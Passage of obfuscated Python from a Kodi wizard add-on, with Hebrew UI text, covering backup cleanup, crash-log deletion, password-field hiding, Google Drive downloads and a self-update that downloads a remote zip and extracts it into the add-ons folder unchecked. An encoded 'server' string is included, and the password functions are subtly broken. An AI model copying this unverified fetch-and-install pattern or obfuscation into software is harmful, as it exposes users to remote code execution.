    O000O0O0OOOO00O00 =workingURL (OOOO0000O000O0000 )#line:1766
    if not O000O0O0OOOO00O00 ==True :#line:1767
        if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems the your enter isnt working, Would you like to create it anyways?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O0OOOO00O00 ),yeslabel ="[B][COLOR red]Yes Create[/COLOR][/B]",nolabel ="[B][COLOR green]No Cancel[/COLOR][/B]"):#line:1768
            return #line:1769
    OO0OOO0OO0OOO0OO0 =getKeyboard ('',"%s: Insert the name for the QRCode."%ADDONTITLE )#line:1770
    OO0OOO0OO0OOO0OO0 ="QrImage_%s"%id_generator (6 )if OO0OOO0OO0OOO0OO0 ==""else OO0OOO0OO0OOO0OO0 #line:1771
    OOO000OO000O0OOO0 =generateQR (OOOO0000O000O0000 ,OO0OOO0OO0OOO0OO0 )#line:1772
    DIALOG .ok (ADDONTITLE ,"[COLOR %s]The QRCode image has been created and is located in the addondata directory:[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OO000O0OOO0 .replace (HOME ,'')))#line:1773
def cleanupBackup ():#line:1775
    O0OOOO000OOOOO0OO =translatepath (MYBUILDS )#line:1776
    OO0O0O0O0000O00O0 =glob .glob (os .path .join (O0OOOO000OOOOO0OO ,"*"))#line:1777
    OOO0000OOOO000OO0 =[];OOOO00OO0000O0OO0 =[]#line:1778
    if len (OO0O0O0O0000O00O0 )==0 :#line:1779
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Backup Location: Empty[/COLOR]"%(COLOR2 ))#line:1780
        return #line:1781
    for OO000000O0000O000 in sorted (OO0O0O0O0000O00O0 ,key =os .path .getmtime ):#line:1782
        OOOO00OO0000O0OO0 .append (OO000000O0000O000 )#line:1783
        OO0O00O00O0O0O00O =OO000000O0000O000 .replace (O0OOOO000OOOOO0OO ,'')#line:1784
        if os .path .isdir (OO000000O0000O000 ):#line:1785
            OOO0000OOOO000OO0 .append ('/%s/'%OO0O00O00O0O0O00O )#line:1786
        elif os .path .isfile (OO000000O0000O000 ):#line:1787
            OOO0000OOOO000OO0 .append (OO0O00O00O0O0O00O )#line:1788
    OOO0000OOOO000OO0 =['--- Remove All Items ---']+OOO0000OOOO000OO0 #line:1789
    O000OO0OOOOO0O0O0 =DIALOG .select ("%s: Select the items to remove from 'MyBuilds'."%ADDONTITLE ,OOO0000OOOO000OO0 )#line:1790
    if O000OO0OOOOO0O0O0 ==-1 :#line:1792
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1793
    elif O000OO0OOOOO0O0O0 ==0 :#line:1794
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to clean up all items in your 'My_Builds' folder?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,MYBUILDS ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1795
            O0OOO000O0O0OO000 ,OO0O00O0O0O000OO0 =cleanHouse (translatepath (MYBUILDS ))#line:1796
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Removed Files: [COLOR %s]%s[/COLOR] / Folders:[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOO000O0O0OO000 ,COLOR1 ,OO0O00O0O0O000OO0 ))#line:1797
        else :#line:1798
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1799
    else :#line:1800
        O0O00O0000OOO00OO =OOOO00OO0000O0OO0 [O000OO0OOOOO0O0O0 -1 ];O0OOO0OO0OOO0O00O =False #line:1801
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove [COLOR %s]%s[/COLOR] from 'My_Builds' folder?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0000OOOO000OO0 [O000OO0OOOOO0O0O0 ]),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00O0000OOO00OO ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1802
            if os .path .isfile (O0O00O0000OOO00OO ):#line:1803
                try :#line:1804
                    os .remove (O0O00O0000OOO00OO )#line:1805
                    O0OOO0OO0OOO0O00O =True #line:1806
                except :#line:1807
                    log ("Unable to remove: %s"%O0O00O0000OOO00OO )#line:1808
            else :#line:1809
                cleanHouse (O0O00O0000OOO00OO )#line:1810
                try :#line:1811
                    shutil .rmtree (O0O00O0000OOO00OO )#line:1812
                    O0OOO0OO0OOO0O00O =True #line:1813
                except Exception as O0OOOOOO00OOO00OO :#line:1814
                    log ("Error removing %s"%O0O00O0000OOO00OO ,5 )#line:1815
            if O0OOO0OO0OOO0O00O :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed![/COLOR]"%(COLOR2 ,OOO0000OOOO000OO0 [O000OO0OOOOO0O0O0 ]))#line:1816
            else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Removing %s![/COLOR]"%(COLOR2 ,OOO0000OOOO000OO0 [O000OO0OOOOO0O0O0 ]))#line:1817
        else :#line:1818
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1819
def getCond (O0O000O0OOOO0000O ):#line:1821
    return xbmc .getCondVisibility (O0O000O0OOOO0000O )#line:1822
def ebi (OO00O0O00OO0O0O0O ):#line:1824
    xbmc .executebuiltin (OO00O0O00OO0O0O0O )#line:1825
def refresh ():#line:1827
    ebi ('Container.Refresh()')#line:1828
def splitNotify (O00O00O0O00000OOO ):#line:1830
    O00000O0O00OO0OO0 =openURL (O00O00O0O00000OOO ).replace ('\r','').replace ('\t','').replace ('\n','[CR]')#line:1831
    if O00000O0O00OO0OO0 .find ('|||')==-1 :return False ,False #line:1832
    O0O00OO00OO000000 ,OO0O0OOOOO0OO0O00 =O00000O0O00OO0OO0 .split ('|||')#line:1833
    if OO0O0OOOOO0OO0O00 .startswith ('[CR]'):OO0O0OOOOO0OO0O00 =OO0O0OOOOO0OO0O00 [4 :]#line:1834
    return O0O00OO00OO000000 .replace ('[CR]',''),OO0O0OOOOO0OO0O00 #line:1835
def forceUpdate (silent =False ):#line:1837
    ebi ('UpdateAddonRepos()')#line:1838
    ebi ('UpdateLocalAddons()')#line:1839
def convertSpecial (O0O0OOOOO0OOOOO0O ,over =False ):#line:1843
    O0OOOOOO0O0O0O0OO =fileCount (O0O0OOOOO0OOOOO0O );O00OOOO000O0OO0OO =0 #line:1844
    DP .create (ADDONTITLE ,"[COLOR %s]Changing Physical Paths To Special"%COLOR2 ,"","Please Wait[/COLOR]")#line:1845
    for O000OO00O00000O0O ,OO0000O00OOOO0O00 ,O0O0O0OO00000000O in os .walk (O0O0OOOOO0OOOOO0O ):#line:1846
        for O00OO00OO0OO0O0O0 in O0O0O0OO00000000O :#line:1847
            O00OOOO000O0OO0OO +=1 #line:1848
            OO00O00O00OO0OO0O =int (percentage (O00OOOO000O0OO0OO ,O0OOOOOO0O0O0O0OO ))#line:1849
            if O00OO00OO0OO0O0O0 .endswith (".xml")or O00OO00OO0OO0O0O0 .endswith (".hash")or O00OO00OO0OO0O0O0 .endswith ("properies"):#line:1850
                DP .update (OO00O00O00OO0OO0O ,"[COLOR %s]Scanning: [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O000OO00O00000O0O .replace (HOME ,'')),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00OO0OO0O0O0 ),"Please Wait[/COLOR]")#line:1851
                O000000OOOOO0000O =open (os .path .join (O000OO00O00000O0O ,O00OO00OO0OO0O0O0 )).read ()#line:1852
                OO000O000O0OOO0O0 =urllib .quote (HOME )#line:1853
                OOOOOOOOO000000O0 =urllib .quote (HOME ).replace ('%3A','%3a').replace ('%5C','%5c')#line:1854
                OO00OOOO0OOO0O0OO =O000000OOOOO0000O .replace (HOME ,'special://home/').replace (OO000O000O0OOO0O0 ,'special://home/').replace (OOOOOOOOO000000O0 ,'special://home/')#line:1855
                OO0O00OO0O0000000 =open ((os .path .join (O000OO00O00000O0O ,O00OO00OO0OO0O0O0 )),mode ='w')#line:1856
                OO0O00OO0O0000000 .write (str (OO00OOOO0OOO0O0OO ))#line:1857
                OO0O00OO0O0000000 .close ()#line:1858
    DP .close ()#line:1859
    log ("[Convert Paths to Special] Complete",5 )#line:1860
    if over ==False :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Convert Paths to Special: Complete![/COLOR]"%COLOR2 )#line:1861
def clearCrash ():#line:1863
    O0OO00OOOO0OOO0OO =[]#line:1864
    for OOO0O000O0O000OOO in glob .glob (os .path .join (LOG ,'*crashlog*.*')):#line:1865
        O0OO00OOOO0OOO0OO .append (OOO0O000O0O000OOO )#line:1866
    if len (O0OO00OOOO0OOO0OO )>0 :#line:1867
        if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the Crash logs?'%COLOR2 ,'[COLOR %s]%s[/COLOR] Files Found[/COLOR]'%(COLOR1 ,len (O0OO00OOOO0OOO0OO )),yeslabel ="[B][COLOR green]Remove Logs[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Logs[/COLOR][/B]"):#line:1868
            for OO0O000000O00O0OO in O0OO00OOOO0OOO0OO :#line:1869
                os .remove (OO0O000000O00O0OO )#line:1870
            LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]%s Crash Logs Removed[/COLOR]'%(COLOR2 ,len (O0OO00OOOO0OOO0OO )))#line:1871
        else :LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Crash Logs Cancelled[/COLOR]'%COLOR2 )#line:1872
    else :LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]No Crash Logs Found[/COLOR]'%COLOR2 )#line:1873
def hidePassword ():#line:1875
    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]hide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Hide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1876
        O0000O000OO0000O0 =0 #line:1877
        for OO00O0O0O00O0OO00 in glob .glob (os .path .join (ADDONS ,'*/')):#line:1878
            O0000OOOOOO0000OO =os .path .join (OO00O0O0O00O0OO00 ,'resources','settings.xml')#line:1879
            if os .path .exists (O0000OOOOOO0000OO ):#line:1880
                OOOOOO0OO0OOOO0OO =open (O0000OOOOOO0000OO ).read ()#line:1881
                O00O00OO00OO00O00 =parseDOM (OOOOOO0OO0OOOO0OO ,'addon',ret ='id')#line:1882
                for OOO0OO000O0OOOOO0 in O00O00OO00OO00O00 :#line:1883
                    if 'pass'in OOO0OO000O0OOOOO0 :#line:1884
                        if not 'option="hidden"'in OOO0OO000O0OOOOO0 :#line:1885
                            try :#line:1886
                                O000O0OO0OO000O00 =OOO0OO000O0OOOOO0 .replace ('/','option="hidden" /')#line:1887
                                OOOOOO0OO0OOOO0OO .replace (OOO0OO000O0OOOOO0 ,O000O0OO0OO000O00 )#line:1888
                                O0000O000OO0000O0 +=1 #line:1889
                                log ("[Hide Passwords] found in %s on %s"%(O0000OOOOOO0000OO .replace (HOME ,''),OOO0OO000O0OOOOO0 ),5 )#line:1890
                            except :#line:1891
                                pass #line:1892
                OO0OOO00O00O00OOO =open (O0000OOOOOO0000OO ,mode ='w');OO0OOO00O00O00OOO .write (OOOOOO0OO0OOOO0OO );OO0OOO00O00O00OOO .close ()#line:1893
        LogNotify ("[COLOR %s]Hide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O0000O000OO0000O0 ))#line:1894
        log ("[Hide Passwords] %s items changed"%O0000O000OO0000O0 ,5 )#line:1895
    else :log ("[Hide Passwords] Cancelled",5 )#line:1896
def unhidePassword ():#line:1898
    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]unhide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Unhide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1899
        O0O00OO0O0OO0O0OO =0 #line:1900
        for OO00OO0000O0000O0 in glob .glob (os .path .join (ADDONS ,'*/')):#line:1901
            OOOOOO00O000OOOOO =os .path .join (OO00OO0000O0000O0 ,'resources','settings.xml')#line:1902
            if os .path .exists (OOOOOO00O000OOOOO ):#line:1903
                OO0OO0000OO0OOOO0 =open (OOOOOO00O000OOOOO ).read ()#line:1904
                OO0OOOOOO0O000OOO =parseDOM (OO0OO0000OO0OOOO0 ,'addon',ret ='id')#line:1905
                for O00O00O0OO00O0O00 in OO0OOOOOO0O000OOO :#line:1906
                    if 'pass'in O00O00O0OO00O0O00 :#line:1907
                        if 'option="hidden"'in O00O00O0OO00O0O00 :#line:1908
                            try :#line:1909
                                O000O000O0OOOO0O0 =O00O00O0OO00O0O00 .replace ('option="hidden"','')#line:1910
                                OO0OO0000OO0OOOO0 .replace (O00O00O0OO00O0O00 ,O000O000O0OOOO0O0 )#line:1911
                                O0O00OO0O0OO0O0OO +=1 #line:1912
                                log ("[Unhide Passwords] found in %s on %s"%(OOOOOO00O000OOOOO .replace (HOME ,''),O00O00O0OO00O0O00 ),5 )#line:1913
                            except :#line:1914
                                pass #line:1915
                O0OOOOO0O000000O0 =open (OOOOOO00O000OOOOO ,mode ='w');O0OOOOO0O000000O0 .write (OO0OO0000OO0OOOO0 );O0OOOOO0O000000O0 .close ()#line:1916
        LogNotify ("[COLOR %s]Unhide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O0O00OO0O0OO0O0OO ))#line:1917
        log ("[Unhide Passwords] %s items changed"%O0O00OO0O0OO0O0OO ,5 )#line:1918
    else :log ("[Unhide Passwords] Cancelled",5 )#line:1919
def chunk_report (O000O0OO00OOOO0OO ,O0OOOO0OO0O0OOOOO ,O0O0O0O0O0O0OO000 ):#line:1920
   O00OOO0000O0OO0O0 =float (O000O0OO00OOOO0OO )/O0O0O0O0O0O0OO000 #line:1921
   O00OOO0000O0OO0O0 =round (O00OOO0000O0OO0O0 *100 ,2 )#line:1922
   if O000O0OO00OOOO0OO >=O0O0O0O0O0O0OO000 :#line:1924
      sys .stdout .write ('\n')#line:1925
def chunk_read (O00O00O0OO00OOOO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:1927
   import time #line:1928
   OOOOO00O000O0OOOO =100 #line:1929
   OOOOO00000000O00O =0 #line:1931
   O0O00OO00000OO0OO =time .time ()#line:1932
   O0OOO0O0O00OO00OO =0 #line:1933
   with open (destination ,"wb")as OOO0OO00000000O00 :#line:1936
    while 1 :#line:1937
      O00O000OO0000OO0O =time .time ()-O0O00OO00000OO0OO #line:1938
      OO0000O00O000OOOO =int (O0OOO0O0O00OO00OO *chunk_size )#line:1939
      O000O0000OOO0OOOO =O00O00O0OO00OOOO0 .read (chunk_size )#line:1940
      OOO0OO00000000O00 .write (O000O0000OOO0OOOO )#line:1941
      OOO0OO00000000O00 .flush ()#line:1942
      OOOOO00000000O00O +=len (O000O0000OOO0OOOO )#line:1943
      O0OOO0O0000OO0O00 =float (OOOOO00000000O00O )/OOOOO00O000O0OOOO #line:1944
      O0OOO0O0000OO0O00 =round (O0OOO0O0000OO0O00 *100 ,2 )#line:1945
      if int (O00O000OO0000OO0O )>0 :#line:1946
        O0OOOO00OO0O0O00O =int (OO0000O00O000OOOO /(1024 *O00O000OO0000OO0O ))#line:1947
      else :#line:1948
         O0OOOO00OO0O0O00O =0 #line:1949
      if O0OOOO00OO0O0O00O >1024 and not O0OOO0O0000OO0O00 ==100 :#line:1950
          OO00O00O0O00O0OOO =int (((OOOOO00O000O0OOOO -OO0000O00O000OOOO )/1024 )/(O0OOOO00OO0O0O00O ))#line:1951
      else :#line:1952
          OO00O00O0O00O0OOO =0 #line:1953
      if OO00O00O0O00O0OOO <0 :#line:1954
        OO00O00O0O00O0OOO =0 #line:1955
      dp .update (int (O0OOO0O0000OO0O00 ),"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOO0O0000OO0O00 ,OO0000O00O000OOOO /(1024 *1024 ),OOOOO00O000O0OOOO /(1000 *1000 ),O0OOOO00OO0O0O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00O00O0O00O0OOO ,60 ))#line:1956
      if dp .iscanceled ():#line:1957
         dp .close ()#line:1958
         break #line:1959
      if not O000O0000OOO0OOOO :#line:1960
         break #line:1961
      if report_hook :#line:1963
         report_hook (OOOOO00000000O00O ,chunk_size ,OOOOO00O000O0OOOO )#line:1964
      O0OOO0O0O00OO00OO +=1 #line:1965
   return OOOOO00000000O00O #line:1967
server ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'#line:1968
def googledrive_download (O0O0OO0OO000O0000 ,O0OOO00O0OOOO00O0 ,OO0O00000000O0000 ,O0O0OOOOOOO00O0O0 ):#line:1969
    O0OOO0OO0O0OOOOOO =[]#line:1973
    OOOOO0OOO0O00O0O0 =O0O0OO0OO000O0000 .split ('=')#line:1974
    O0O0OO0OO000O0000 =OOOOO0OOO0O00O0O0 [len (OOOOO0OOO0O00O0O0 )-1 ]#line:1975
    def O0000OO00O0OOO00O (O0OOO0OO0000OOOOO ):#line:1977
        for O00OO00O00OOOOOO0 in O0OOO0OO0000OOOOO :#line:1979
            O0O0O00O0O0OOO0O0 =O00OO00O00OOOOOO0 .value #line:1982
            if 'download_warning'in O00OO00O00OOOOOO0 .name :#line:1983
                return O00OO00O00OOOOOO0 .value #line:1986
            return O0O0O00O0O0OOO0O0 #line:1987
        return None #line:1989
    def O0OOOO00OOOOOO000 (OOOO0OO00OO0OO000 ,O0O0O0O0OOO0OOOOO ):#line:1991
        O0O00O000O0OO0O0O =32768 #line:1993
        OOO0000000O0OOO0O =time .time ()#line:1994
        with open (O0O0O0O0OOO0OOOOO ,"wb")as OO00O00O00OO00OO0 :#line:1996
            O0O00OO0OO0OO0OO0 =1 #line:1997
            OOOOO00OO0OO0000O =32768 #line:1998
            try :#line:1999
                O00O00O000000OO0O =int (OOOO0OO00OO0OO000 .headers .get ('content-length'))#line:2000
                print ('file total size :',O00O00O000000OO0O )#line:2001
            except TypeError :#line:2002
                print ('using dummy length !!!')#line:2003
                O00O00O000000OO0O =int (O0O0OOOOOOO00O0O0 )*1000000 #line:2004
            for OO0O0OO00OO0O0000 in OOOO0OO00OO0OO000 .iter_content (O0O00O000O0OO0O0O ):#line:2005
                if OO0O0OO00OO0O0000 :#line:2006
                    OO00O00O00OO00OO0 .write (OO0O0OO00OO0O0000 )#line:2007
                    OO00O00O00OO00OO0 .flush ()#line:2008
                    OO000O000OOOO0OOO =time .time ()-OOO0000000O0OOO0O #line:2009
                    O00000OO0OOO00O0O =int (O0O00OO0OO0OO0OO0 *OOOOO00OO0OO0000O )#line:2010
                    if OO000O000OOOO0OOO ==0 :#line:2011
                        OO000O000OOOO0OOO =0.1 #line:2012
                    OOOOO0OO0O00000OO =int (O00000OO0OOO00O0O /(1024 *OO000O000OOOO0OOO ))#line:2013
                    O0OO000OO0O0O0O0O =int (O0O00OO0OO0OO0OO0 *OOOOO00OO0OO0000O *100 /O00O00O000000OO0O )#line:2014
                    if OOOOO0OO0O00000OO >1024 and not O0OO000OO0O0O0O0O ==100 :#line:2015
                      O00OOOOO0OO000000 =int (((O00O00O000000OO0O -O00000OO0OOO00O0O )/1024 )/(OOOOO0OO0O00000OO ))#line:2016
                    else :#line:2017
                      O00OOOOO0OO000000 =0 #line:2018
                    OO0O00000000O0000 .update (int (O0OO000OO0O0O0O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO000OO0O0O0O0O ,O00000OO0OOO00O0O /(1024 *1024 ),O00O00O000000OO0O /(1000 *1000 ),OOOOO0OO0O00000OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OOOOO0OO000000 ,60 ))#line:2020
                    O0O00OO0OO0OO0OO0 +=1 #line:2021
                    if OO0O00000000O0000 .iscanceled ():#line:2022
                     OO0O00000000O0000 .close ()#line:2023
                     break #line:2024
    O00000OOO0OOOOO0O ="https://docs.google.com/uc?export=download"#line:2025
    import urllib2 #line:2030
    import cookielib #line:2031
    from cookielib import CookieJar #line:2033
    OO00OO00OOOOOOOOO =CookieJar ()#line:2035
    OO0O0OO0OO0O0OO00 =build_opener (HTTPCookieProcessor (OO00OO00OOOOOOOOO ))#line:2036
    OO00000O0O00OOOO0 ={'id':O0O0OO0OO000O0000 }#line:2038
    O0O000O0OO00O0O00 =urllib .urlencode (OO00000O0O00OOOO0 )#line:2039
    OOOOOO00OO0O00O00 =OO0O0OO0OO0O0OO00 .open (O00000OOO0OOOOO0O +'&'+O0O000O0OO00O0O00 )#line:2041
    O0OO0O0000000O0O0 =OOOOOO00OO0O00O00 .read ()#line:2042
    OO00O0000OO000000 =O0000OO00O0OOO00O (OO00OO00OOOOOOOOO )#line:2046
    if OO00O0000OO000000 :#line:2048
        OOOO000OOOO0OOO0O ={'id':O0O0OO0OO000O0000 ,'confirm':OO00O0000OO000000 }#line:2049
        O0OOO0O0000OOOOO0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:2050
        O0O000O0OO00O0O00 =urllib .urlencode (OOOO000OOOO0OOO0O )#line:2051
        OOOOOO00OO0O00O00 =OO0O0OO0OO0O0OO00 .open (O00000OOO0OOOOO0O +'&'+O0O000O0OO00O0O00 )#line:2052
        chunk_read (OOOOOO00OO0O00O00 ,report_hook =chunk_report ,dp =OO0O00000000O0000 ,destination =O0OOO00O0OOOO00O0 ,filesize =O0O0OOOOOOO00O0O0 )#line:2053
    return (O0OOO0OO0O0OOOOOO )#line:2057
def resetkodi ():#line:2058
        if xbmc .getCondVisibility ('system.platform.windows'):#line:2059
            O00OO0O0OO0OOO00O =xbmcgui .DialogProgress ()#line:2060
            try :#line:2061
                O00OO0O0OO0OOO00O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:2063
            except :#line:2064
                O00OO0O0OO0OOO00O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:2066
            O00OO0O0OO0OOO00O .update (0 )#line:2067
            for O000OO0OOO00O0O00 in range (5 ,-1 ,-1 ):#line:2068
                time .sleep (1 )#line:2069
                try :#line:2070
                    O00OO0O0OO0OOO00O .update (int ((5 -O000OO0OOO00O0O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O000OO0OOO00O0O00 ),'')#line:2071
                except :#line:2072
                    O00OO0O0OO0OOO00O .update (int ((5 -O000OO0OOO00O0O00 )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O000OO0OOO00O0O00 )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:2073
                if O00OO0O0OO0OOO00O .iscanceled ():#line:2074
                    from resources .libs import win #line:2075
                    return None ,None #line:2076
            from resources .libs import win #line:2077
        else :#line:2078
            O00OO0O0OO0OOO00O =xbmcgui .DialogProgress ()#line:2079
            try :#line:2080
                O00OO0O0OO0OOO00O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:2082
            except :#line:2083
                O00OO0O0OO0OOO00O .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:2085
            O00OO0O0OO0OOO00O .update (0 )#line:2086
            for O000OO0OOO00O0O00 in range (5 ,-1 ,-1 ):#line:2087
                time .sleep (1 )#line:2088
                try :#line:2089
                    O00OO0O0OO0OOO00O .update (int ((5 -O000OO0OOO00O0O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O000OO0OOO00O0O00 ),'')#line:2090
                except :#line:2091
                    O00OO0O0OO0OOO00O .update (int ((5 -O000OO0OOO00O0O00 )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O000OO0OOO00O0O00 )+'\n'+'')#line:2092
                if O00OO0O0OO0OOO00O .iscanceled ():#line:2093
                    from resources .libs import android #line:2095
                    return None ,None #line:2096
            from resources .libs import android #line:2097
def wizardUpdate (startup =None ):#line:2100
    if not xbmc .Player ().isPlaying ():#line:2101
        if workingURL (WIZARDFILE ):#line:2102
            O000OOO000O0OO0O0 =checkWizard ('version')#line:2103
            OO0OO0O0OOO000000 =checkWizard ('zip')#line:2104
            if O000OOO000O0OO0O0 !=False and str (O000OOO000O0OO0O0 )>str (VERSION ):#line:2107
                O0OOOO0O0O000OOOO =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,str (O000OOO000O0OO0O0 )))#line:2109
                try :os .remove (O0OOOO0O0O000OOOO )#line:2110
                except :pass #line:2111
                if 'google'in OO0OO0O0OOO000000 :#line:2112
                    OO0O00O00O0OO0OOO =googledrive_download (OO0OO0O0OOO000000 ,O0OOOO0O0O000OOOO ,DP2 ,checkWizard ('filesize'))#line:2113
                else :#line:2114
                    downloaderwiz .download4 (OO0OO0O0OOO000000 ,O0OOOO0O0O000OOOO ,DP2 )#line:2115
                xbmc .sleep (1000 )#line:2116
                DP2 .create ('מתקין')#line:2117
                DP2 .update (100 ,message ='אנא המתן ...')#line:2118
                extract .all (O0OOOO0O0O000OOOO ,ADDONS )#line:2119
                DP2 .close ()#line:2120
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:2122
                log ("[Auto Update Wizard] Wizard updated to v%s"%str (O000OOO000O0OO0O0 ),5 )#line:2123
                return #line:2125
            else :#line:2126
                if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:2127
                log ("[Auto Update Wizard] No New Version v%s"%str (O000OOO000O0OO0O0 ),5 )#line:2128
        else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,5 )#line:2129
def wizardUpdateDP (startup =None ):#line:2131
    if workingURL (WIZARDFILE ):#line:2132
        OO000O0O000OO0OOO =checkWizard ('version')#line:2133
        O000OOO00OOOOOOOO =checkWizard ('zip')#line:2134
        if OO000O0O000OO0OOO !=False and str (OO000O0O000OO0OOO )>str (VERSION ):#line:2135
            log ("[Auto Update Wizard] Installing wizard v%s"%str (OO000O0O000OO0OOO ),5 )#line:2138
            DP .create (ADDONTITLE ,'[COLOR %s]מוריד גירסה חדשה יותר של Wizard'%COLOR2 +'\n'+''+'\n'+'אנא המתן[/COLOR]')#line:2140
            OOO0000OOOOOO000O =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,str (OO000O0O000OO0OOO )))#line:2141
            try :os .remove (OOO0000OOOOOO000O )#line:2142
            except :pass #line:2143
            if 'google'in O000OOO00OOOOOOOO :#line:2144
                O00OOO00000O00000 =googledrive_download (O000OOO00OOOOOOOO ,OOO0000OOOOOO000O ,DP ,checkWizard ('filesize'))#line:2145
            downloader .download (O000OOO00OOOOOOOO ,OOO0000OOOOOO000O ,DP )#line:2146
            xbmc .sleep (1000 )#line:2147
            DP .update (0 ,"Installing %s update"%ADDONTITLE )#line:2149
            OO00O0O0O0OOO0OOO ,OOO0000OOOOO0OOOO ,O0O0000O000OOO00O =extract .all (OOO0000OOOOOO000O ,ADDONS ,DP ,True )#line:2150
            DP .close ()#line:2151
            resetkodi ()#line:2152
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:2153
            return #line:2155
        else :#line:2156
            if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:2157
            log ("[Auto Update Wizard] No New Version v%s"%str (OO000O0O000OO0OOO ),5 )#line:2158
    else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,5 )#line:2159
def convertText ():#line:2161
    OO00O00O000OOOOO0 =os .path .join (ADDONDATA ,'TextFiles')#line:2162
    if not os .path .exists (OO00O00O000OOOOO0 ):os .makedirs (OO00O00O000OOOOO0 )#line:2163
